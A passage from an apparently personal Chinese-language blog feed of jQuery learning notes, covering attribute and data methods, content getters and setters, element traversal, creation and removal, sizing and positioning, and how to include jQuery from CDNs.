class="line"><span class="language-javascript">        $(<span class="string">&quot;a&quot;</span>).<span class="title function_">prop</span>(<span class="string">&quot;title&quot;</span>,<span class="string">&quot;我们都挺好&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        $(<span class="string">&quot;input&quot;</span>).<span class="title function_">change</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>($(<span class="variable language_">this</span>).<span class="title function_">prop</span>(<span class="string">&quot;checked&quot;</span>));</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">       </span><br></pre></td></tr></table></figure><h5 id="4.2设置或获取元素自定义属性值attr()">4.2设置或获取元素自定义属性值attr()<a title="#4.2设置或获取元素自定义属性值attr()" href="#4.2设置或获取元素自定义属性值attr()"></a></h5><ul><li><p>获取属性：</p><p><code>attr(&quot;属性&quot;) //类似元素getAttribute()</code></p></li><li><p>设置属性：</p><p><code>attr(&quot;属性&quot;,&quot;属性值&quot;) //类似原生setAttribute()</code></p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>($(<span class="string">&quot;div&quot;</span>),<span class="title function_">attr</span>(<span class="string">&quot;index&quot;</span>));</span><br></pre></td></tr></table></figure><h5 id="4.3数据缓存data()">4.3数据缓存data()<a title="#4.3数据缓存data()" href="#4.3数据缓存data()"></a></h5><p>data()方法可以在指定元素上存取数据，并不会修改DOM元素结构，一旦页面刷新，之前存放的数据都将被移除</p><ul><li><p>附加数据语法：</p><p><code>data(&quot;name&quot;,&quot;value) //向被选择元素附加数据</code></p></li><li><p>获取数据语法：</p><p><code>data('name') //向被选元素获取数据</code></p><p><font size=3 color="red">可以读取html5自定义属性data-index，得到数字型</font></p></li></ul><h4 id="5.jquery内容文本值">5.jQuery内容文本值<a title="#5.jquery内容文本值" href="#5.jquery内容文本值"></a></h4><p>主要针对元素的内容还有表单的值的操作</p><ul><li><p>普通元素内容html() 相当于原生inner HTML</p><p><code>html() //获取元素的内容</code></p><p><code>html(&quot;内容&quot;) //设置元素的内容</code></p></li><li><p>普通元素文本内容text() 相当于原生innerText</p><p><code>text() //获取元素的文本内容</code></p><p><code>text(&quot;内容&quot;) //设置元素的文本内容</code></p></li><li><p>表单元素 val()</p><p><code>val() //获取表单的值</code></p><p><code>val(&quot;内容&quot;) //设置表单内容</code></p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1. 获取设置元素内容 html() </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>($(<span class="string">&quot;div&quot;</span>).<span class="title function_">html</span>()); <span class="comment">//会打印出 标签</span></span><br><span class="line">$(<span class="string">&quot;div&quot;</span>).<span class="title function_">html</span>(<span class="string">&quot;123&quot;</span>) <span class="number">000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 获取设置元素文本内容 text() </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>($(<span class="string">&quot;div&quot;</span>).<span class="title function_">text</span>()); <span class="comment">//打印出文本</span></span><br><span class="line">$(<span class="string">&quot;div&quot;</span>).<span class="title function_">text</span>(<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3. 获取设置表单值 val()</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>($(<span class="string">&quot;input&quot;</span>).<span class="title function_">val</span>());</span><br><span class="line">$(<span class="string">&quot;input&quot;</span>).<span class="title function_">val</span>(<span class="string">&quot;123&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="6.jquery元素操作（遍历、创建、添加、删除）">6.jQuery元素操作（遍历、创建、添加、删除）<a title="#6.jquery元素操作（遍历、创建、添加、删除）" href="#6.jquery元素操作（遍历、创建、添加、删除）"></a></h4><h5 id="6.1遍历元素">6.1遍历元素<a title="#6.1遍历元素" href="#6.1遍历元素"></a></h5><p>jQuery隐式迭代是对同一类元素做同样的操作，如果想要给同一类元素做不同操作，就需要用到遍历</p><p><strong>语法1：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;div&quot;</span>).<span class="title function_">each</span>(<span class="keyword">function</span>(<span class="params">index,domEle</span>)&#123;xxx;&#125;)</span><br></pre></td></tr></table></figure><ul><li><p>each()方法遍历匹配的每一个元素，主要用DOM处理</p></li><li><p>里面的回调函数有2个参数：index是每个元素的索引号；domEle是每个<font color="red">DOM对象，不是jQuery对象</font></p></li><li><p><font color="red">所以想要使用jQuery方法，需要给这个dom元素转换为jQuery对象</font></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> arr=[<span class="string">&quot;red&quot;</span>,<span class="string">&quot;green&quot;</span>,<span class="string">&quot;blue&quot;</span>];</span><br><span class="line">    $(<span class="string">&quot;div&quot;</span>).<span class="title function_">each</span>(<span class="keyword">function</span>(<span class="params">i,domEle</span>)&#123;</span><br><span class="line">        <span class="comment">//回调函数第一个参数是索引号 可以自己指定索引号名称 </span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(i);</span><br><span class="line">        <span class="comment">//回调函数第二个参数是dom元素对象</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(domEle);</span><br><span class="line">        <span class="comment">//domEle.css(&quot;color&quot;); dom对象没有css方法</span></span><br><span class="line">        $(domEle).<span class="title function_">css</span>(<span class="string">&quot;color&quot;</span>,arr[i]);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>语法2：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.<span class="title function_">each</span>(object,<span class="keyword">function</span>(<span class="params">index,element</span>)&#123; xxx; &#125;)</span><br></pre></td></tr></table></figure><ul><li><p>$.each()方法可用于遍历任何对象，主要用于<font color="red">数据处理，比如数组，对象</font></p></li><li><p>里面的函数有2个参数：index是每个元素的索引号element遍历内容</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$.<span class="title function_">each</span>(arr,<span class="keyword">function</span>(<span class="params">i,ele</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(i);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(ele);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">$.<span class="title function_">each</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&quot;andy&quot;</span>,</span><br><span class="line">    <span class="attr">age</span>:<span class="number">18</span></span><br><span class="line">&#125;,<span class="keyword">function</span>(<span class="params">i,ele</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(i);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(ele);    </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><h5 id="6.2创建元素">6.2创建元素<a title="#6.2创建元素" href="#6.2创建元素"></a></h5><p><strong>语法：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;&lt;li&gt;&lt;/li&gt;&quot;</span>); <span class="comment">//动态创建一个li</span></span><br></pre></td></tr></table></figure><h5 id="6.3添加元素">6.3添加元素<a title="#6.3添加元素" href="#6.3添加元素"></a></h5><ol><li><p>内部添加</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">element.<span class="title function_">append</span>(<span class="string">&quot;内容&quot;</span>) <span class="comment">//把内容放入匹配元素内部  最后面 类似与appendChild</span></span><br><span class="line"></span><br><span class="line">element.<span class="title function_">prepend</span>(<span class="string">&quot;内容&quot;</span>) <span class="comment">//把内容放入匹配元素内部 最前面</span></span><br></pre></td></tr></table></figure></li><li><p>外部添加</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">element.<span class="title function_">after</span>(<span class="string">&quot;内容&quot;</span>) <span class="comment">//把内容放入目标元素后面</span></span><br><span class="line"></span><br><span class="line">element.<span class="title function_">before</span>(<span class="string">&quot;内容&quot;</span>) <span class="comment">//把内容放入目标元素前面</span></span><br></pre></td></tr></table></figure><p><font color="red">内部添加元素 生成之后 是父子关系</font></p><p><font color="red">外部添加元素 生成之后 是兄弟关系</font></p></li></ol><h5 id="6.4删除元素">6.4删除元素<a title="#6.4删除元素" href="#6.4删除元素"></a></h5><p><strong>语法：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">element.<span class="title function_">remove</span>() <span class="comment">//删除匹配的元素（本身） 自杀</span></span><br><span class="line"></span><br><span class="line">element.<span class="title function_">empty</span>() <span class="comment">//删除匹配元素集合中所有子节点 孩子</span></span><br><span class="line"></span><br><span class="line">element.<span class="title function_">html</span>(<span class="string">&quot;&quot;</span>) <span class="comment">//清空匹配的元素内容 孩子</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//1.创建元素</span></span><br><span class="line">    <span class="keyword">var</span> li=$(<span class="string">&quot;&lt;li&gt;我是后来创建的li&lt;/li&gt;&quot;</span>);</span><br><span class="line">    <span class="comment">//2.添加元素</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//（1）.内部添加</span></span><br><span class="line">$(<span class="string">&quot;ul&quot;</span>).<span class="title function_">append</span>(li) <span class="comment">//把内容放入匹配元素内部  最后面 类似与appendChild</span></span><br><span class="line">$(<span class="string">&quot;ul&quot;</span>).<span class="title function_">prepend</span>(li) <span class="comment">//把内容放入匹配元素内部 最前面</span></span><br><span class="line">    <span class="comment">//（2）.外部添加</span></span><br><span class="line">    <span class="keyword">var</span> div=$(<span class="string">&quot;&lt;div&gt;我是后妈生的&lt;/div&gt;&quot;</span>);</span><br><span class="line">    $(<span class="string">&quot;.test&quot;</span>).<span class="title function_">after</span>(div);</span><br><span class="line">    $(<span class="string">&quot;.test&quot;</span>).<span class="title function_">before</span>(div);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//3.删除元素</span></span><br><span class="line">    $(<span class="string">&quot;ul&quot;</span>).<span class="title function_">remove</span>(); </span><br><span class="line">    $(<span class="string">&quot;ul&quot;</span>).<span class="title function_">empty</span>();</span><br><span class="line">    $(<span class="string">&quot;ul&quot;</span>).<span class="title function_">html</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="7.jquery尺寸、位置操作">7.jQuery尺寸、位置操作<a title="#7.jquery尺寸、位置操作" href="#7.jquery尺寸、位置操作"></a></h4><h5 id="7.1jquery尺寸">7.1jQuery尺寸<a title="#7.1jquery尺寸" href="#7.1jquery尺寸"></a></h5><img src="https://s1.328888.xyz/2022/04/09/XkFf2.png" style="zoom:60%;" align="left" /><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">div</span>&#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>:<span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>:<span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>:pink;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">padding</span>:<span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border</span>:<span class="number">15px</span> solid red;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin</span>:<span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//1.width()/height() 获取设置元素 width和height大小</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>($(<span class="string">&quot;div&quot;</span>).<span class="title function_">width</span>()); <span class="comment">//200</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//$(&quot;div&quot;).width(300);  //300</span></span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//2.innerWidth() / innerHeight() 获取设置元素 width 和height ＋padding 大小</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>($(<span class="string">&quot;div&quot;</span>).<span class="title function_">innerWidth</span>()); <span class="comment">//220</span></span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//3.outerWidth() / outerHeight() 获取设置元素 width 和 height+padding +border 大小</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>($(<span class="string">&quot;div&quot;</span>).<span class="title function_">outerWidth</span>()); <span class="comment">//250</span></span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//4.outerWidth(ture) /outerHeight(true) 获取设置 width 和 height+padding+border+margin 大小</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>($(<span class="string">&quot;div&quot;</span>).<span class="title function_">outerWidth</span>(<span class="literal">true</span>)); <span class="comment">//290</span></span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="7.2jquery位置">7.2jQuery位置<a title="#7.2jquery位置" href="#7.2jquery位置"></a></h5><p>位置主要有三个：offset ()、position()、scrollTop() / scrollLeft()</p><img src="https://s1.328888.xyz/2022/04/09/XkvGX.png" style="zoom:60%;" align="left" /><img src="https://s1.328888.xyz/2022/04/09/XkMOC.png" style="zoom:89%;" align="left" /><img src="https://s1.328888.xyz/2022/04/09/Xkoh1.png" style="zoom:50%;" align="left" /><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//1.获取设置距离文档的位置(偏移) offset</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>($(<span class="string">&quot;.son&quot;</span>).<span class="title function_">offset</span>());</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>($(<span class="string">&quot;.son&quot;</span>).<span class="title function_">offset</span>().<span class="property">top</span>);</span><br><span class="line">    $(<span class="string">&quot;.son&quot;</span>).<span class="title function_">offest</span>(&#123;</span><br><span class="line">        <span class="attr">top</span>:<span class="number">200</span>,</span><br><span class="line">        <span class="attr">left</span>:<span class="number">200</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">//2.获取距离大有定位父级位置（偏移）position 如果没有带有定位的父级，则以文档为准</span></span><br><span class="line">    <span class="comment">//这个方法只能获取 不能设置</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>($(<span class="string">&quot;.son&quot;</span>).<span class="title function_">position</span>());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//3.被卷去的头部 scrollTop() /被卷去的左侧 scrollLeft()</span></span><br><span class="line">    <span class="comment">//页面滚动事件</span></span><br><span class="line">     $(<span class="variable language_">window</span>).<span class="title function_">scroll</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>($(<span class="variable language_">document</span>).<span class="title function_">scrollTop</span>());</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jQuery </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>01 jQuery概述</title>
      <link href="/learningNotes/jquery/01jQuery%E6%A6%82%E8%BF%B0"/>
      <url>/learningNotes/jquery/01jQuery%E6%A6%82%E8%BF%B0</url>
      
        <content type="html"><![CDATA[<h4 id="1-jqurey-概述">1 jQurey 概述<a title="#1-jqurey-概述" href="#1-jqurey-概述"></a></h4><h5 id="1.1-jquery的概念">1.1 jQuery的概念<a title="#1.1-jquery的概念" href="#1.1-jquery的概念"></a></h5><p>jQuery 是一个快速简介的 js 库，其设计宗旨是 “write less，do more”；<br>j：js<br>Query：查询<br>即是把js中的 dom 操作做了封装，使之可以快速查询使用里面的功能</p><p>jquery 封装了js常用的功能代码，优化了 DOM 操作、事件处理、动画设计、ajax交互…<br>学习jq的本质就是学习调用这些方法</p><h5 id="1.2-jquery的优点">1.2 jQuery的优点<a title="#1.2-jquery的优点" href="#1.2-jquery的优点"></a></h5><ul><li>轻量级</li><li>跨浏览器兼容</li><li>链式编程、隐式迭代</li><li>对事件、样式、动画支持，大大简化了DOM操作</li><li>支持插件扩展开发</li><li>免费开源</li></ul><h4 id="2-jquery的基本使用">2 jQuery的基本使用<a title="#2-jquery的基本使用" href="#2-jquery的基本使用"></a></h4><h5 id="2.1-jquery的下载">2.1 jQuery的下载<a title="#2.1-jquery的下载" href="#2.1-jquery的下载"></a></h5><p><strong>官方网址</strong>：<a href="https://jquery.com/">https://jquery.com/</a><br>(下方右使用说明<br>右边有棕色的“download”，左键点击<br>production jQuery: 生产版本 压缩过 工作用的<br>development jQuery: 开发版本 无压缩<br>选其一 全选ctrl+A 复制<br>新建一文件 jquery.min.js  粘贴代码)</p><p><strong>版本的区别</strong><br>+ 1x: 兼容IE 678等低版本浏览器，官网不再更新<br>+ 2x: 不兼容IE 678等低版本浏览器，官网不再更新<br>+ 3x: 不兼容IE 678等低版本浏览器，官方主要更新维护版本</p><h5 id="2.2-jquery的使用">2.2 jQuery的使用<a title="#2.2-jquery的使用" href="#2.2-jquery的使用"></a></h5><p>把jq引用到html页面中的<head>即可</p>   <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">scr</span>=<span class="string">&quot;jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>2.1 2.2用不了的话 用下面</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//jquery-3.3.1：字节跳动jquery压缩版引用地址: （速度快推荐！）</span></span><br><span class="line">&lt;script src=<span class="string">&quot;https://s3.pstatp.com/cdn/expire-1-M/jquery/3.3.1/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//jquery-3.2.1：字节跳动jquery压缩版引用地址: （速度快推荐！）</span></span><br><span class="line">&lt;script src=<span class="string">&quot;https://s3.pstatp.com/cdn/expire-1-M/jquery/3.2.1/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//jquery-1.11.3：百度压缩版引用地址: </span></span><br><span class="line">&lt;script src=<span class="string">&quot;https://libs.baidu.com/jquery/1.11.3/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//jquery-1.5.2：百度压缩版引用地址:</span></span><br><span class="line">&lt;script src=<span class="string">&quot;https://libs.baidu.com/jquery/1.5.2/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h5 id="2.3-jquery的入口函数">2.3 jQuery的入口函数<a title="#2.3-jquery的入口函数" href="#2.3-jquery的入口函数"></a></h5>   <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    ...  <span class="comment">//此处是页面DOM加载完成的入口</span></span><br><span class="line">&#125;);  </span><br></pre></td></tr></table></figure><p><strong>或者</strong></p>   <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    ...  <span class="comment">//此处是页面DOM加载完成的入口</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure> <img src="img\2.3入口函数.png" style="zoom:80%;" />   <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使div元素隐藏</span></span><br><span class="line">$(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $(<span class="string">&#x27;div&#x27;</span>).<span class="title function_">hide</span>();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="2.4-jquery的顶级对象$">2.4 jQuery的顶级对象$<a title="#2.4-jquery的顶级对象$" href="#2.4-jquery的顶级对象$"></a></h5><ol><li>$是jQuery的别称 在代码中可以用jQuery代替$</li><li>$是jQuery的顶级对象，相当于js中的window，把元素利用￥包装成jQuery对象，就可以调用看query的方法</li></ol><h5 id="2.5.1-jquery对象和dom对象">2.5.1 jQuery对象和DOM对象<a title="#2.5.1-jquery对象和dom对象" href="#2.5.1-jquery对象和dom对象"></a></h5><ol><li><p>DOM对象：用原生js代码获取的对象</p><p><code>var myDiv=document.querySelector('div');</code></p></li><li><p>jQuery对象：用jQuery方式获取过来的对象  本质：<font color="red">通过$把DOM元素进行包装</font></p><p><code>$('div');</code>  //获取过来是伪数组的形式</p></li><li><p><font color="red">jQuery对象只能用jQuery方法  DOM对象只能用原生的js的属性和方法</font></p><p>两者用<code>console.dir(myDiv)/console.dir($('div'))</code>打印出来的结果不一样</p></li></ol><h5 id="2.5.2-jquery对象和dom对象的相互转换">2.5.2 jQuery对象和DOM对象的相互转换<a title="#2.5.2-jquery对象和dom对象的相互转换" href="#2.5.2-jquery对象和dom对象的相互转换"></a></h5><p>jQuery对象与DOM对象之间是可以相互转换的，因为原生js比jQuery更大，原生的一些属性和方法jQuery没有封装，if要使用，jQuery对象就得转换为DOM对象</p><ol><li><p>DOM对象转换为jQuery对象：<font color="red">$(DOM对象)</font></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">&quot;mov.mp4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $(<span class="string">&#x27;video&#x27;</span>); <span class="comment">//直接获取视频，得到jQuery对象</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> myvideo = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>); <span class="comment">//dom对象</span></span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//1.dom--&gt;jquery</span></span></span><br><span class="line"><span class="language-javascript">    $(myvideo);</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//.play()方法 播放video js原生方法</span></span></span><br><span class="line"><span class="language-javascript">    myvideo.<span class="title function_">play</span>()  <span class="comment">// √</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//$(myvideo).play() ×   </span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>jQuery对象转换为DOM对象：</p><p><code>$(‘div’)[index]  //index是索引号</code></p><p><code>$(’div‘).get(index)  //index是索引号</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//往中间插入</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.jQuery对象转换为dom对象</span></span><br><span class="line">$(<span class="string">&#x27;video&#x27;</span>)[<span class="number">0</span>].<span class="title function_">play</span>()  <span class="comment">//√  因为$(&#x27;video&#x27;)[0]已经是dom对象</span></span><br><span class="line">$(<span class="string">&#x27;video&#x27;</span>).<span class="title function_">get</span>(<span class="number">0</span>).<span class="title function_">play</span>() <span class="comment">//也可</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jQuery </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js bom对象概述</title>
      <link href="/learningNotes/js/08%20BOM%E6%A6%82%E8%BF%B0"/>
      <url>/learningNotes/js/08%20BOM%E6%A6%82%E8%BF%B0</url>
      
